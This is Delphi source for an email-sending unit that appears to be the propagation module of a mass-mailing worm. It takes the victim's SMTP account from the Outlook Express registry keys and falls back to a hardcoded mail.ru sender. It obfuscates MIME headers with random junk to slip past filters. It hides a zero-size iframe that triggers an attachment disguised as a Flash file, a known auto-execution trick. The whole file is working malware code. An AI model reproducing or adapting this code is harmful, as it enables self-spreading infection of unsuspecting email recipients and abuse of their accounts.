UNIT Email;

INTERFACE

USES
  Registry, Utils;

PROCEDURE SendEmail(Subject,Body,Recip,AttachmentPath,AttachmentName:AnsiString);

IMPLEMENTATION

CONST
  WinSocket    = 'wsock32.dll';
  SOCKET_ERROR = -1;
  AF_INET      = 2;
  SOCK_STREAM  = 1;
  IPPROTO_IP   = 0;
  Code64       = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=*-/][.,><? !~@#$%^&';

TYPE
  SunB = PACKED RECORD
    s_b1 : Char;
    s_b2 : Char;
    s_b3 : Char;
    s_b4 : Char;
  END;

  SunW = PACKED RECORD
    s_w1 : WORD;
    s_w2 : WORD;
  END;

  WSAData = RECORD
    wVersion        : WORD;
    wHighVersion    : WORD;
    szDescription   : ARRAY[0..256] OF Char;
    szSystemStatus  : ARRAY[0..128] OF Char;
    iMaxSockets     : WORD;
    iMaxUdpDg       : WORD;
    lpVendorInfo    : pChar;
  END;

  in_addr = RECORD
    CASE Integer OF
      0 : (S_un_b : SunB);
      1 : (S_un_w : SunW);
      2 : (S_addr : DWORD);
    END;

  TInAddr = in_addr;

  sockaddr_in = RECORD
    CASE Integer OF
      0 : (sin_family : WORD;
           sin_port   : WORD;
           sin_addr   : TInAddr;
           sin_zero   : ARRAY[0..7] OF Char);
      1 : (sa_family  : WORD;
           sa_data    : ARRAY[0..13] OF Char)
  END;

  PHostEnt = ^THostEnt;

  HostEnt = RECORD
    h_name     : pChar;
    h_aliases  :^pChar;
    h_addrtype : SmallInt;
    h_length   : SmallInt;
    CASE BYTE OF
      0: (h_addr_list :^pChar);
      1: (h_addr      :^pChar)
  END;

  THostEnt    = HostEnt;
  TSocket     = Integer;
  HINTERNET   = Pointer;
  DWORD       = LongWord;
  BOOL        = LongBool;
  TWSAData    = WSAData;
  PInAddr     =^TInAddr;
  TSockAddrIn = sockaddr_in;
  TSockAddr   = sockaddr_in;
  UINT        = LongWord;
  Triple      = ARRAY[1..3] OF BYTE;
  Quad        = ARRAY[1..4] OF BYTE;

VAR
  Wsadatas   : TWSADATA;
  SockAddrIn : TSockAddrIn;
  Sock       : TSocket;
  Buf        : ARRAY[0..255] OF Char;
  MySmtp     : STRING;
  iAddr      : Integer;
  SMTPServer : STRING;
  SMTPAcc    : STRING;
  FileBuf    : ARRAY[1..200000] OF BYTE;

FUNCTION Send(S:TSocket;VAR Buf;Len,Flags:Integer) : Integer; STDCALL; EXTERNAL WinSocket Name 'send';
FUNCTION WSAStartup(wVersionRequired:WORD;VAR WSData: TWSAData) : Integer; STDCALL; EXTERNAL WinSocket Name 'WSAStartup';
FUNCTION Socket(Af,Struct,Protocol:Integer) : TSocket; STDCALL; EXTERNAL WinSocket Name 'socket';
FUNCTION Htons(HostShort:WORD) : WORD; STDCALL; EXTERNAL WinSocket Name 'htons';
FUNCTION inet_addr(CP:PChar) : DWORD; STDCALL; EXTERNAL WinSocket Name 'inet_addr';
FUNCTION Connect(S:TSocket;VAR Name:TSockAddr;Namelen:Integer) : Integer; STDCALL; EXTERNAL WinSocket Name 'connect';
FUNCTION Recv(S:TSocket;VAR Buf;Len,Flags:Integer) : Integer; STDCALL; EXTERNAL WinSocket Name 'recv';
FUNCTION CloseSocket(S:TSocket) : Integer; STDCALL; EXTERNAL WinSocket Name 'closesocket';
FUNCTION inet_ntoa(n_addr:in_addr) : pChar; STDCALL; EXTERNAL WinSocket Name 'inet_ntoa';
FUNCTION GetHostByName(HostName:pChar) : PHostEnt; STDCALL; EXTERNAL WinSocket Name 'gethostbyname';
FUNCTION WSACleanup() : Integer; STDCALL; EXTERNAL WinSocket Name 'WSACleanup';

FUNCTION EncodeQuotedPrintable(S:STRING) : STRING;
VAR
  I : WORD;
  J : BYTE;
  D : STRING;
  K : STRING;
BEGIN
  D:=S[1]+S[2];
  I:=2;
  J:=2;
  REPEAT
    Inc(I);
    Inc(J);
    K:=IntToHex2(Ord(S[I]));
    IF J=26 THEN BEGIN
      D:=D+'='+CRLF;
      J:=1;
    END;
    D:=D+'='+K;
  UNTIL I=Length(S);
  RESULT:=D;
END;

FUNCTION PolyString(STR:STRING) : STRING;
VAR
  I : WORD;
  L : WORD;
  K : WORD;
  T : STRING;
  O : Char;
  R : STRING;
BEGIN
  FOR I:=1 TO Length(Str) DO BEGIN
    L:=Random(5)+1;
    IF Random(2)=0 THEN O:=UpCase(STR[I]) ELSE begin r:=LowerCase(STR[I]); o:=r[1];end;
    T:=T+O+'(';
    FOR K:=1 TO L DO T:=T+Code64[Random(82)+1];
    T:=T+')';
  END;
  RESULT:=T;
END;

FUNCTION NameToIP(HostName:STRING) : STRING;
LABEL Abort;
TYPE
  TAPInAddr = ARRAY[0..100] OF PInAddr;
  PAPInAddr =^TAPInAddr;
VAR
  WSAData    : TWSAData;
  HostEntPtr : PHostEnt;
  pptr       : PAPInAddr;
  I          : Integer;
BEGIN
  WSAStartUp($101,WSAData);
  TRY
    HostEntPtr:=GetHostByName(PChar(HostName));
    IF HostEntPtr=NIL THEN GOTO Abort;
    pptr:=PAPInAddr(HostEntPtr^.h_addr_list);
    I:=0;
    WHILE pptr^[I]<>NIL DO BEGIN
      RESULT:=(inet_ntoa(pptr^[I]^));
      Inc(I);
    END;
    Abort:
  EXCEPT
  END;
  WSACleanUp();
END;

PROCEDURE GetDefaultSMTPServer;
VAR
  Registry   : TRegistry;
  AccountStr : STRING;
begin
  Registry:=TRegistry.Create;
  TRY
    Registry.RootKey:=HKEY_CURRENT_USER;
    IF Registry.OpenKey('software\microsoft\internet account manager',False) THEN BEGIN
      AccountStr:=Registry.ReadString('default mail account');
      Registry.CloseKey;
      IF (AccountStr<>'') THEN
        IF Registry.OpenKey('software\microsoft\internet account manager\accounts\'+AccountStr,False) THEN BEGIN
          SMTPServer:=Registry.ReadString('SMTP Server');
          SMTPAcc:=Registry.ReadString('SMTP Email Address');
          Registry.CloseKey;
        END;
    END;
  FINALLY
    Registry.Free;
  END;
END;

FUNCTION Codeb64(Count:BYTE;T:Triple) : STRING;
VAR
  Q    : Quad;
  Strg : STRING;
BEGIN
  IF Count<3 THEN BEGIN
    T[3]:=0;
    Q[4]:=64;
  END ELSE Q[4]:=(T[3] AND $3F);
  IF Count<2 THEN BEGIN
    T[2]:=0;
    Q[3]:=64;
  END ELSE Q[3]:=Byte(((T[2] SHL 2)OR(T[3] SHR 6)) AND $3F);
  Q[2]:=Byte(((T[1] SHL 4) OR (t[2] SHR 4)) AND $3F);
  Q[1]:=((T[1] SHR 2) AND $3F);
  Strg:='';
  FOR Count:=1 TO 4 DO Strg:=(Strg+Code64[(Q[Count]+1)]);
  RESULT:=Strg;
END;

FUNCTION BASE64(DataLength:DWORD) : AnsiString;
VAR
  B      : AnsiString;
  I      : DWORD;
  Remain : DWORD;
  Trip   : Triple;
  Count  : WORD;
BEGIN
  Count:=0;
  B:='';
  FOR I:=1 TO DataLength DIV 3 DO BEGIN
    INC(Count,4);
    Trip[1]:=Ord(FileBuf[(I-1)*3+1]);
    Trip[2]:=Ord(FileBuf[(I-1)*3+2]);
    Trip[3]:=Ord(FileBuf[(I-1)*3+3]);
    B:=B+codeb64(3,Trip);
    IF Count=76 THEN BEGIN
      B:=B+CRLF;
      Count:=0;
    END;
  END;
  Remain:=DataLength-(DataLength DIV 3)*3;
  IF Remain>0 THEN BEGIN
    Trip[1]:=Ord(FileBuf[DataLength-1]);
    IF Remain>1 THEN Trip[2]:=Ord(FileBuf[DataLength]);
    IF Remain=1 THEN B:=B+Codeb64(1,Trip) ELSE B:=B+Codeb64(2,Trip);
  END;
  RESULT:=B;
END;

PROCEDURE Mys(STR:STRING);
VAR
  I : DWORD;
BEGIN
  FOR I:=1 TO Length(STR) DO IF Send(Sock,STR[I],1,0)=SOCKET_ERROR THEN exit;
END;

FUNCTION RandomLines:AnsiString;
VAR
  A,B,E,F : BYTE;
BEGIN
  A:=Random(10);
  FOR B:=1 TO A DO BEGIN
    E:=Random(40);
    FOR F:=1 TO E DO RESULT:=RESULT+Code64[Random(60)+1];
    RESULT:=RESULT+CRLF;
  END;
END;

{FUNCTION GetDate : STRING;
CONST
  M : ARRAY [1..12] OF pChar = ('JAN','FEB','MAR','APR','MAY','JUN','JUL','AUG','SEP','OCT','NOV','DEC');
VAR
  Year  : WORD;
  Month : WORD;
  Day   : WORD;
  Hour  : WORD;
  Min   : WORD;
  Sec   : WORD;
  MSec  : WORD;
  sYear : STRING;
  sDay  : STRING;
  sHour : STRING;
  sMin  : STRING;
  sSec  : STRING;
BEGIN
  DecodeDate(Now,Year,Month,Day);
  DecodeTime(NOW,Hour,Min,Sec,MSec);
  Str(Year,sYear);
  Str(Day,sDay);
  Str(Hour,sHour);
  Str(Sec,sSec);
  Str(Min,sMin);

  RESULT:='Date: '+sDay+' '+M[Month]+' '+sYear+' '+sHour+':'+sMin+':'+sSec+' +0100';
END;}

PROCEDURE SendEmail(Subject,Body,Recip,AttachmentPath,AttachmentName:AnsiString);
VAR
  F    : FILE;
  From : STRING;
BEGIN
  GetDefaultSMTPServer;
  IF SMTPServer='' THEN BEGIN
    SMTPServer:='mail.ru';
    SMTPAcc:='viktor@mail.ru';
  END;
  From:=SMTPAcc;
  MySmtp:=NameToIP(SMTPServer);
  WSAStartUp(257,wsadatas);
  Sock:=Socket(AF_INET,SOCK_STREAM,IPPROTO_IP);
  SockAddrIn.sin_family:=AF_INET;
  htons(25);
  SockAddrIn.sin_port:=htons(25);
  iaddr:=inet_addr(PChar(MySmtp));
  SockAddrIn.sin_addr.S_addr:=iaddr;
  Connect(Sock,SockAddrIn,SizeOf(SockAddrIn));
  Recv(Sock,Buf,Sizeof(Buf),0);
  Mys('HELO net.com'+CRLF);
  Recv(Sock,Buf,SizeOf(Buf),0);
  Mys('MAIL FROM: '+From+CRLF+'Subject: '+Subject+CRLF);
  Recv(Sock,Buf,SizeOf(Buf),0);
  Mys('RCPT TO: '+Recip+CRLF);
  Recv(Sock,Buf,SizeOf(Buf),0);
  Mys('DATA'+CRLF);
  Recv(Sock,Buf,SizeOf(Buf),0);
  Mys(PolyString('MIME-Version: 1.0')+CRLF);
  Mys('Content-Type: '+PolyString('multipart/mixed;')+CRLF);
  Mys('    '+PolyString('boundary=')+'"bla"'+CRLF);
  Mys('Subject: '+Subject+CRLF+CRLF);
  //Mys(GetDate+CRLF);
  Mys(RandomLines+CRLF);
  Mys('--bla'+CRLF);
  Mys('Content-Type: '+PolyString('text/plain; charset:us-ascii')+CRLF+CRLF);
  Mys(Body+CRLF+CRLF);
  Mys('--bla'+CRLF);
  Mys('Content-Type: '+PolyString('text/html')+CRLF);
  Mys('Content-Transfer-Encoding: '+PolyString('quoted-printable')+CRLF+CRLF);
  Mys(EncodeQuotedPrintable('<HTML>')+CRLF+CRLF);
  Mys(EncodeQuotedPrintable('<HEAD>')+CRLF+CRLF);
  Mys(EncodeQuotedPrintable('</HEAD>')+CRLF+CRLF);
  Mys(EncodeQuotedPrintable('<BODY >')+CRLF+CRLF);
  Mys(EncodeQuotedPrintable('<iframe src=cid:EMAIL height=3D0 width=0></iframe>')+CRLF+CRLF);
  Mys(EncodeQuotedPrintable('</BODY>')+CRLF+CRLF);
  Mys(EncodeQuotedPrintable('</HTML>')+CRLF);
  Mys('--bla'+CRLF);
  Mys('Content-Type: '+PolyString('application/x-shockwave-flash;')+CRLF);
  Mys('    '+PolyString('name=')+'"'+AttachmentName+'"'+CRLF);
  Mys('Content-Transfer-Encoding: '+PolyString('base64')+CRLF);
  Mys('Content-ID: <EMAIL>'+CRLF+CRLF);

  AssignFile(F,AttachmentPath+AttachmentName);
  IF FileExists(AttachmentPath+AttachmentName) THEN BEGIN
    Reset(F,1);
    BlockRead(F,FileBuf[1],FileSize(F));
    Mys(BASE64(FileSize(F)));
    CloseFile(F);
  END;

  Mys(CRLF+'--bla--'+CRLF+CRLF);
  Mys(CRLF+'.'+CRLF);
  Recv(Sock,Buf,SizeOf(Buf),0);
  Mys('QUIT'+CRLF);
  Recv(Sock,Buf,SizeOf(Buf),0);
END;
END.

